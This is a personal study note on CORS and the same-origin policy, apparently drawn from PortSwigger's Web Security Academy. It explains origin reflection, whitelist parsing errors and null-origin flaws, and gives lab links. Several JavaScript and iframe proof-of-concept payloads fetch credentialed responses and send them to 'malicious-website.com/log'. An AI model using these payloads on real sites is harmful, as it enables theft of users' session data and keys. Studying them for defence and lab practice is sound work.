# Cross-origin resource sharing (CORS)
- In this section, we will explain what cross-origin resource sharing (CORS) is, describe some common examples of cross-origin resource sharing based attacks, and discuss how to protect against these attacks. This topic was written in collaboration with PortSwigger Research, who popularized this attack class with the presentation [Exploiting CORS misconfigurations for Bitcoins and bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties).
## What is CORS (cross-origin resource sharing)?
- Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF). 
- ![[p1-portswigger1.png]]
## Same-origin policy
- [[API-Sec#Same Origin Policy]]
- The same-origin policy is a web browser security mechanism that aims to prevent websites from attacking each other.
- The same-origin policy restricts scripts on one origin from accessing data from another origin. An origin consists of a **URI scheme, domain and port number**. For example, consider the following URL:
- `http://normal-website.com/example/example.html`
- This uses the scheme `http`, the domain `normal-website.com`, and the port number `80`. The following table shows how the same-origin policy will be applied if content at the above URL tries to access other origins:
- |URL accessed|Access permitted?|
	- |`http://normal-website.com/example/`           |Yes: same scheme, domain, and port|
	- |`http://normal-website.com/example2/`         |Yes: same scheme, domain, and port|
	- |`https://normal-website.com/example/`         |No: different scheme and port           |
	- |`http://en.normal-website.com/example/`     |No: different domain                           |
	- |`http://www.normal-website.com/example/`   |No: different domain                           |
	- |`http://normal-website.com:8080/example/` |No: different port*                              |
- *Internet Explorer will allow this access because IE does not take account of the port number when applying the same-origin policy.
## Why is the same-origin policy necessary?
- When a browser sends an HTTP request from one origin to another, any cookies, including authentication session cookies, relevant to the other domain are also sent as part of the request. This means that the response will be generated within the user's session, and include any relevant data that is specific to the user. Without the same-origin policy, if you visited a malicious website, it would be able to read your emails from GMail, private messages from Facebook, etc.
## How is the same-origin policy implemented?

The same-origin policy generally controls the access that JavaScript code has to content that is loaded cross-domain. Cross-origin loading of page resources is generally permitted. For example, the SOP allows embedding of images via the `<img>` tag, media via the `<video>` tag, and JavaScript via the `<script>` tag. However, while these external resources can be loaded by the page, any JavaScript on the page won't be able to read the contents of these resources.

There are various exceptions to the same-origin policy:

- Some objects are writable but not readable cross-domain, such as the `location` object or the `location.href` property from iframes or new windows.
- Some objects are readable but not writable cross-domain, such as the `length` property of the `window` object (which stores the number of frames being used on the page) and the `closed` property.
- The `replace` function can generally be called cross-domain on the `location` object.
- You can call certain functions cross-domain. For example, you can call the functions `close`, `blur` and `focus` on a new window. The `postMessage` function can also be called on iframes and new windows in order to send messages from one domain to another.

Due to legacy requirements, the same-origin policy is more relaxed when dealing with cookies, so they are often accessible from all subdomains of a site even though each subdomain is technically a different origin. You can partially mitigate this risk using the `HttpOnly` cookie flag.

It's possible to relax same-origin policy using `document.domain`. This special property allows you to relax SOP for a specific domain, but only if it's part of your FQDN (fully qualified domain name). For example, you might have a domain `marketing.example.com` and you would like to read the contents of that domain on `example.com`. To do so, both domains need to set `document.domain` to `example.com`. Then SOP will allow access between the two domains despite their different origins. In the past it was possible to set `document.domain` to a TLD such as `com`, which allowed access between any domains on the same TLD, but now modern browsers prevent this.



## Vulnerabilities arising from CORS configuration issues

- Many modern websites use CORS to allow access from subdomains and trusted third parties. Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities.
- ### Server-generated ACAO header from client-specified Origin header

	- Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively **allowing access from any other domain.**

	- One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:
	- `GET /sensitive-victim-data HTTP/1.1 Host: vulnerable-website.com Origin: https://malicious-website.com Cookie: sessionid=...`

	- It then responds with:

	- `HTTP/1.1 200 OK Access-Control-Allow-Origin: https://malicious-website.com Access-Control-Allow-Credentials: true ...`

	- These headers state that access is allowed from the requesting domain (`malicious-website.com`) and that the cross-origin requests can include cookies (`Access-Control-Allow-Credentials: true`) and so will be processed in-session.

	- Because the application reflects arbitrary origins in the `Access-Control-Allow-Origin` header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF  token, you could retrieve this by placing the following script on your website:
	- 
```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true;
req.send();
function reqListener() { location='//malicious-website.com/log?key='+this.responseText;
};
```
- 
	- #### [practice in this lab](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
```html
<script> 
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;
req.send();
function reqListener() { 
	location='/log?key='+this.responseText; 
};
</script>
```
- ##### Explanation  Above Code
	- step one `req` send a request with by cookies To the vulnerable site.
	- step two when loaded `req`  function reqlistener run and send responseText `req`  To attacker.domain/l`og?key` 
### Errors parsing Origin headers

Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the `Access-Control-Allow-Origin` header so that access is granted. For example, the application receives a normal request like:

`GET /data HTTP/1.1 Host: normal-website.com ... Origin: https://innocent-website.com`

The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:

`HTTP/1.1 200 OK ... Access-Control-Allow-Origin: https://innocent-website.com`

Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.

For example, suppose an application grants access to all domains ending in:

`normal-website.com`

An attacker might be able to gain access by registering the domain:

`hackersnormal-website.com`

Alternatively, suppose an application grants access to all domains beginning with

`normal-website.com`

An attacker might be able to gain access using the domain:

`normal-website.com.evil-user.net`




## Whitelisted null origin value
- The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:
- Cross-origin redirects.
- Requests from serialized data.
- Request using the `file:` protocol.
- Sandboxed cross-origin requests.
- Some applications might whitelist the `null` origin to support local development of the application. For example, suppose an application receives the following cross-origin request:
```http
GET /sensitive-victim-data
Host: vulnerable-website.com 
Origin: null
```
- And the server responds with:
```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
- In this situation, an attacker can use various tricks to generate a cross-origin request containing the value `null` in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed `iframe` cross-origin request of the form:
- ##### [lab](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script> 
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true;
req.send();
function reqListener() {
		location='malicious-website.com/log?key='+this.responseText; 
}; 
</script>"></iframe>`
```
### [practice in lab](https://skf.gitbook.io/asvs-write-ups/cors-exploitation/cors-exploitation)
- you can exploit by this codes
```html
<script>
		function loadXMLDoc() {
			var xhr = new XMLHttpRequest();
			xhr.onreadystatechange = function() {
				if(this.readyState == 4 && this.status == 200) {
					var xhr2 = new  XMLHttpRequest
					<!-- console.log(this.responseText); -->
					xhr2.open('GET', 'http://127.0.0.1/s.html/?' + escape(this.responseText));
					xhr2.withCredentials = true
					xhr2.send();

				}
			};
			xhr.open('GET', 'http://127.0.0.1:5000/confidential');
			xhr.withCredentials  = true;
			xhr.send();
		}
		loadXMLDoc();
	</script>	

```


```html
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','http://0.0.0.0:5000/confidential', true);
  req.withCredentials = true;
  req.send();

  function reqListener(){
    var foo = document.getElementById("stolenInfo").innerHTML= req.responseText;
    Console.log(foo)
  }
</script>

<p id="stolenInfo"></p>
```


# after read and practiceing [XSS]
# That's all, I'll read the rest later.